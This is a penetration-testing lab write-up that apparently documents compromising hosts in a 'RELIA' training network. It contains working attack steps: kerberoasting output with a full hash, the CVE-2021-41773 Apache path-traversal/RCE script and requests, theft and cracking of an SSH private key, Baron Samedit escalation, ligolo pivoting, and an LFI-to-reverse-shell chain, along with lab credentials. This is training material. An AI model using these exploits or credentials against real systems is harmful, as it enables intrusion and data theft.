  RELIA.COM = {
    kdc = DC02.relia.com
    admin_server = DC02.relia.com
  }

[domain_realm]
  .relia.com = RELIA.COM
  relia.com = RELIA.COM
```

We run bloodhound from kali:

```bash
bloodhound-python -u michelle -p 'NotMyPassword0k?' -k -ns  172.16.111.6 -c All -d relia.com --zip   
```

Alternatively, from the Administrator connection we upload Shaphound.exe and run it. Then, we download the output:

```
.\SharpHound.exe -c All --zipfilename $zipName lala
```

Now we see (for instance) that IIS_Service user is kerberoastable, so we copy Rubeus.exe in the machine and run:

```powershell
.\Rubeus.exe kerberoast /nowrap
```

Output:

```text
[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis service,CN=Users,DC=relia,DC=com
[*] ServicePrincipalName   : http/webby.relia.com
[*] PwdLastSet             : 10/17/2022 5:46:48 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*iis_service$relia.com$http/webby.relia.com@relia.com*$E5DD0887D435FE662236DF34436D57AA$7E6D350AE48BA556D31EA17BCE09C27FA84347F055B6EAA8AFF91AF5FA16572D2D68B741008B631F15466459DA38FD9EDFA76F7BBDF35F94CE7C9D8904B45FEA2D35F9B8CBA0CE087BE6DE917B1964F3D24D96AB8B8F5F25048D47B1D4BD524E59BF9C21D0FC56BD0EEC1F5BD5A9BB10FB5EEDB680E734C754E536A43DD1581B5D4C9C200A81BBB49908C1A89811397E08FD619657B86D32FF1D64CC3EC164DD0F37DE103043A3D0F2CC684DBDE190A74EB02DFDCA5583165A458F7BAD849265A4B56FD7E52B512DF0772A0ED4612BF38718036D89821963F4D3829DDCDFB846B2DE8930CC85E419903949B9A8AC74F39EEC7C530579CBCDFC7F56F62DD076C2AB0CC7520991ED7C9C15ACBEA62F0AA4B19489778478E30718B00E1822BDA49289102E2C7966D7F6CE12244133A83D7DD675FB3AB594F2EA0AF6A88B81134BBAED02F161EE3CDF320B9E03C2729B69CDB41CBC49CEA1B03DAE8A7E572A5C641B92C68316BB1DB524FCD242C096DA7D7C3D21FF6AE9B84950A4019D24258B23BFD74767FEDB6FBFFABC9EE534DE06B4C9CBE609ADD09A472A9652BE90E2A2E6A07CFB1430176FD57CF728BF55919AE52C84C695289EFACAD7EC3E43907FA65C11FC556CD424E03CBFA19D6B61ECA519651E38362315E0F0E633BCDCE0CDF1293D4B1941861ED1C92C88B40C426CE8C1461A787EC84C6FD3FA1B94CFFBFD9D9C7F7807CF76F4662A1FDCE5D4CE640A4E279E3A7EBA8A68189985576AC18B46389C5D4554F8CC113402F17601DE03E1BE809DB72EE0FE980B3BEFB05951522D2918D1BDA706E80DA3D891B9BA4E63A8C57965BEDCD8A95803C5B28D26A628889426A0DED314CD4A4CA2CB008284C1D0BEF350DDE2A5838C418DC80E09EEB9E863A4FCDA86745CFCCBF477FF02102ADB151EE605B1F9BEF059F1A4F52CC2CFA0C16C67D84FACF76AFE0E092D42C6A0F0CA9EAFC3B9D86921AAB28B9990B940FBE3161BDBDA5921093227EB49627F6D20C2FF2E1410FCDDE81F35853831CED0975D1DEAB56849E5F64A95AA029C3BBC6A07071D1F1E5C616C8F89269628A79B0EF4A02C2FEE26D6FC4C5F4DB59E29CCFABAB51564CC595167A31635044E7D40D9BD33A086DD2CF479ABCFE9F24E70CE259077682C767BBF160616CF193DF87CDAC41710F135C1769F3FC278A60D5663E7BC401EEDC882EBD1A25E59CD8C863253D7425BAB62B55896F323580A5A7982AA0DFEA22440E91F2EA86C81B365720561DAB8B3D576D651327D14A717C6BC0A4D26FFD4C15579C1783C8FE9F616AEC03428CB5E58852B0521764B97478C67B060A904EA85B26E1F33DDCE4AE771BDA463FF7C946A9B719B843E557F70A8C44C22D8909BA51915B7C738349DC5D386621A53A253A2E1313210A12ABAD80EC533128CDA0A5A8B926D661CEE1C2E51C98E5F5611ACD13BF32797323573AA7DB3C6F3D268AEFC45396C297B5B83A142A4CAD26055D3E71BDC1FEE9A891E827934784996959D3978DD130A0C9096EC32021BC433C63DECD77847B1AE70D36D829DC76001695488CEE198D2F87715E550374E4DDF955394886931AE3736845DF2F214

```

We try to crack it offline:

```bash
hashcat -m 13100 iis_hash.txt /usr/share/wordlists/rockyou.txt 


smbclient \\\\$vm30\secrets -U iis_service --pw-nt-hash 6436AA0BC6AAEBFFC79CD5760C260CE6
```


```
sudo bloodhound-python -u '$username' -p '$password' -ns $ip -d $domain -c all 

nxc smb 172.16.111.6 -u michelle -p 'NotMyPassword0k?' --generate-krb5-file /path
```

```bash
getTGT.py relia.com/'michelle':'NotMyPassword0k?'

export KRB5CCNAME=$(pwd)/michelle.ccache
```


## vm4 - 172.16.111.14 VM3?????

Command:

```bash
nmap -sC -sV 172.16.111.14
```

Output:

```txt
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WK01.relia.com
| Not valid before: 2026-01-03T16:34:38
|_Not valid after:  2026-07-05T16:34:38
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WK01
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WK01.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.22000
|_  System_Time: 2026-01-04T16:55:00+00:00
|_ssl-date: 2026-01-04T16:55:40+00:00; +29m10s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-04T16:55:00
|_  start_date: N/A
|_nbstat: NetBIOS name: WK01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:ea:60 (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 29m09s, deviation: 0s, median: 29m09s

```


```

```


```

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```



## X vm5 - 172.16.111.30


Command:

```bash
sudo nmap -sC -sV 172.16.111.30 -p- -Pn
```

Output:

```txt
Nmap scan report for 172.16.111.30
Host is up (0.038s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Anna Test Machine
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WEBBY
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WEBBY.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-04T16:55:39+00:00
|_ssl-date: 2026-01-04T16:56:20+00:00; +29m10s from scanner time.
| ssl-cert: Subject: commonName=WEBBY.relia.com
| Not valid before: 2026-01-03T16:34:33
|_Not valid after:  2026-07-05T16:34:33
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-04T16:55:39
|_  start_date: N/A
|_nbstat: NetBIOS name: WEBBY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:c9:26 (VMware)
|_clock-skew: mean: 29m09s, deviation: 0s, median: 29m09s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required


```

```

```


```

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```



## vm6 -172.16.111.15


Command:

```bash
nmap -sC -sV 172.16.111.15
```

Output:

```txt
Nmap scan report for 172.16.111.15
Host is up (0.017s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WK02.relia.com
| Not valid before: 2026-01-03T16:34:45
|_Not valid after:  2026-07-05T16:34:45
|_ssl-date: 2026-01-04T16:58:44+00:00; +29m10s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: WK02
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: WK02.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.22000
|_  System_Time: 2026-01-04T16:58:04+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WK02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:fc:31 (VMware)
|_clock-skew: mean: 29m09s, deviation: 0s, median: 29m09s
| smb2-time: 
|   date: 2026-01-04T16:58:04
|_  start_date: N/A

```


```

```


```

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


## vm7 - 172.16.111.19

Command:

```bash
nmap -sC -sV 172.16.111.19
```

Output:

```txt
Nmap scan report for 172.16.111.19
Host is up (0.012s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 61:d7:77:83:c6:48:69:ca:42:35:0e:62:c3:30:b7:b4 (RSA)
|   256 c7:62:4a:de:a5:b4:f1:2a:5a:f3:a1:d8:d3:96:1b:8d (ECDSA)
|_  256 f2:94:b5:71:88:a1:f8:c5:d9:47:77:6b:07:ae:27:a0 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


```

```


```

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```



## vm8 - 172.16.111.20
Command:

```bash
nmap -sC -sV 172.16.111.20
```

Output:

```txt
Nmap scan report for 172.16.111.20
Host is up (0.014s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 33:4a:77:87:5b:88:f4:f1:f3:bb:75:7b:ec:9e:21:31 (RSA)
|   256 c8:3a:f1:c9:e1:9c:31:2d:9d:26:df:c7:c5:21:d8:e3 (ECDSA)
|_  256 f6:79:92:a4:06:56:38:e3:ca:15:91:a8:dc:94:44:2c (ED25519)
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

```


```

```


```

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```



## vm9 - 172.16.111.21

Command:

```bash
nmap -sC -sV 172.16.111.21
```

Output:

```txt
Nmap scan report for 172.16.111.21
Host is up (0.019s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-04T17:02:04
|_  start_date: N/A
|_clock-skew: 29m09s
|_nbstat: NetBIOS name: FILES, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:df:b8 (VMware)


```

Coming from machine vm2:


```bash
nxc smb 172.16.111.6/24 -u jim -p 'Castello1!' --shares
```

returned:

```
172.16.111.7    445    INTRANET         
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC

172.16.111.21   445    FILES      
Share           Permissions     Remark
ADMIN$                          Remote Admin
apps            READ            
C$                              Default share
IPC$            READ            Remote IPC
monitoring                      
scripts                  
  
172.16.111.30   445    WEBBY            
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC


172.16.111.15   445    WK02             
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC


172.16.111.6    445    DC02             
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share

172.16.111.254  445    LOGIN            
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC


172.16.111.5    445    MAIL             
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC


172.16.111.14   445    WK01             
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC

```



```
smbclient //172.16.111.21/apps -U 'relia.com/jim%Castello1!'
```


```

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```



## [COMPROMISED 3 ] vm10 - 192.168.151.245

Command:

```bash
nmap -sC -sV 192.168.151.245
```

Output:

```txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 12:23 EST
Nmap scan report for 192.168.151.245
Host is up (0.036s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.152
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
|_http-title: RELIA Corp.
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
| ssl-cert: Subject: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2022-10-12T08:55:44
|_Not valid after:  2032-10-09T08:55:44
|_http-title: RELIA Corp.
| tls-alpn: 
|_  http/1.1
2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 30:0c:6c:9b:ac:07:47:5e:df:6d:ff:38:63:38:2a:fd (RSA)
|   256 f3:a9:70:76:c8:d4:c4:17:f4:39:1f:be:58:9d:1f:a5 (ECDSA)
|_  256 21:a0:79:82:2d:e6:2a:76:11:24:2f:7e:2e:a8:c7:83 (ED25519)
8000/tcp open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
Service Info: Host: RELIA; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.59 seconds
```

### local.txt

Access the port 80 via browser and additionally the port 8000 via browser. With Burpsuite, notice the header server

```
Apache/2.4.49 
```

which is vulnerable.

```
searchsploit  --id 2.4.49
searchsploit -m 50383
```


The exploit:

```
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami
```

Execution:

```
bash ./50383.sh targets.txt /etc/passwd
```

In Burpsuite:

```
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: 192.168.151.245:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=UTF-8
Content-Length: 43
Origin: http://192.168.151.245:8000
Connection: keep-alive
Referer: http://192.168.151.245:8000/
```

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
apache:x:997:998::/opt/apache2/htdocs/:/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
```


Get local.txt flag:

```
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/local.txt HTTP/1.1
Host: 192.168.151.245:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=UTF-8
Content-Length: 43
Origin: http://192.168.151.245:8000
Connection: keep-alive
Referer: http://192.168.151.245:8000/


```

List of users:

```
offsec
miranda
steven
mark
anita
```

Anita's authorized keys:

```
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/authorized_keys HTTP/1.1
Host: 192.168.151.245:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=UTF-8
Content-Length: 0
Origin: http://192.168.151.245:8000
Connection: keep-alive
Referer: http://192.168.151.245:8000/



```

Output:

```
HTTP/1.1 200 OK
Date: Thu, 25 Dec 2025 19:05:09 GMT
Server: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
Last-Modified: Fri, 28 Oct 2022 07:55:14 GMT
ETag: "ae-5ec1393faf8aa"
Accept-Ranges: bytes
Content-Length: 174
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThMfArBngFjl7RJYCOTqY5Mmid0sNJwA= anita@relia
```

Anita's private keys:

```bash
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/id_ecdsa HTTP/1.1
Host: 192.168.151.245:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=UTF-8
Content-Length: 0
Origin: http://192.168.151.245:8000
Connection: keep-alive
Referer: http://192.168.151.245:8000/

```

Output:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
-----END OPENSSH PRIVATE KEY-----
```

But it requires a passphrase. Pass the ecdsa-sha2-* key to ssh2john to crack it:

```
/usr/share/john/ssh2john.py id_ana2 > id.hash

john id.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Passphrase: fireball.

Connect via ssh

```bash
ssh -i id_ana2 anita@$vm10 -p 2222
# Enter fireball when prompted 
```

Spawn the shell:

```
bash -i
```



### proof.txt

Run 


Exploit Baron samedit: https://github.com/worawit/CVE-2021-3156/tree/main

For that git clone it:

```
git clone https://github.com/worawit/CVE-2021-3156.git
cd CVE-2021-3156
```

We will run first the [exploit_nss.py](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py "exploit_nss.py")

```bash
python3 exploit_nss.py
```

We are root.

Go to machine vm11


##  [COMPROMISED 4 ] vm11 - 192.168.151.246

Command:

```bash
nmap -sC -sV 192.168.151.246
```

Output:

```txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 12:23 EST
Nmap scan report for 192.168.151.246
Host is up (1.3s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Code Validation
443/tcp  open  ssl/http Apache httpd 2.4.52 ((Ubuntu))
| ssl-cert: Subject: commonName=demo
| Subject Alternative Name: DNS:demo
| Not valid before: 2022-10-12T07:46:27
|_Not valid after:  2032-10-09T07:46:27
| tls-alpn: 
|_  http/1.1
|_http-title: Code Validation
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.52 (Ubuntu)
2222/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:2d:8d:48:ad:10:dd:ff:70:25:8b:46:2e:5c:ff:1d (ECDSA)
|_  256 aa:4a:c3:27:b1:19:30:d7:63:91:96:ae:63:3c:07:dc (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.77 seconds
```

We have a ssh key from vm10 and also the open port 2222. So we try to access the machine with:

```bash
ssh -i id_anita anita@$vm11 -p 2222
# enter "fireball" when prompted
```

And bingo, we are in. Spawn the shell with

```bash
bash -i
```

We observe that there is a internal web application hosted at 127.0.0.1:8000 and /var/www/internal. Also there is that one already detected in the nmap scan allocated at  http://192.168.151.246:80 and /var/www/html

But we are interested in the other one. So we will redirect the local traffic in this machine to our kali by using a ligolo tunnel.


First, we need to create a tun interface:

```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

Second, start the proxy:

```
./proxy -selfcert

```

Third, connect the agent (in the pivot machine) to our proxy in the kali:

```
./agent -connect 192.168.45.152:11601 --ignore-cert

```

Once you start the proxy, it listens on the port “11601” by default. So when you connect to your proxy, you need to specify your IP and that default port (unless other configurations are in place).

Commands in ligolo:

```
# List available sessions
session
# To enter one of them, enter the number they have.

# Add a route to the new interface (in a new kali terminal)
sudo ip route add 240.0.0.1/32 dev ligolo

# Start the tunnel
start
```

The key part is 

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
```

Now, all we have to do now is browse to http://240.0.0.1:8000 from our Kali machine to reach the internal web server running on port 8000.

As we can inspect also the source code from the anita's session we observe the index.php:

```php
<?php

$uname = $_POST['uname'];
if (isset($uname)) {
    echo 'Disabled';
    exit();
}

?>

<!DOCTYPE html>
<html >
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Backend</title>

  <link rel="stylesheet" href="../css/bootstrap.min.css" />
  <style>
    .panel-default {
        opacity: 0.9;
        margin-top:30px;
    }
    .form-group.last {
        margin-bottom:0px;
    }
    </style>
    <script src="/js/backend.js"></script>
</head>
<body>
  <div class="container">
    <div class="row">
        <div class="col-md-4 col-md-offset-7">
            <div class="panel panel-default">

<?php 
$which_view=$_GET['view'];
if(isset($which_view)) {
    include("views/" . $which_view);
} else {
    header('Location: /backend/?view=user.inc');
}
?>
            <div class="panel-footer">Not Registered? <a href="#" class="">Register here</a>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
```

The vulnerability is at 

```php
<?php 
$which_view=$_GET['view'];
if(isset($which_view)) {
    include("views/" . $which_view);
} else {
    header('Location: /backend/?view=user.inc');
}
```

We can also browse to http://240.0.0.1:8000/backend/?view=debug.inc and notice that `allow_url_fopen`is enabled.

So we can browse, for example, to:

```
GET /backend/?view=../../../../../../../etc/passwd HTTP/1.1
Host: 240.0.0.1:8000
```

and confirm the LFI vulnerability. However trying to retrieve some files out of the /var scope is not achievable. So we need to find a writable location to upload a shell.

Find it under: 

```
anita@demo:/var/log$ ls -la /var/lib/php/
total 16
drwxr-xr-x  4 root root 4096 Oct 12  2022 .
drwxr-xr-x 42 root root 4096 Oct 12  2022 ..
drwxr-xr-x  3 root root 4096 Oct 12  2022 modules
drwx-wx-wt  2 root root 4096 Dec 27 20:11 sessions
```

We upload a pentestmonkey.php shell, set a netcat listener and trigger it from:

```bash
GET /backend/?view=../../../../../../../var/lib/php/sessions/pollo.php
Host: 240.0.0.1:8000
```

Now we are www-data. A quick check

```
bash -i
sudo -l
```

Output:

```
www-data@demo:/home$ Matching Defaults entries for www-data on demo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on demo:
    (ALL) NOPASSWD: ALL

```

Then:

```
sudo su
```

And cat the proof.txt




##  [ COMPROMISED  6] vm12 - 192.168.151.247

Command:

```bash
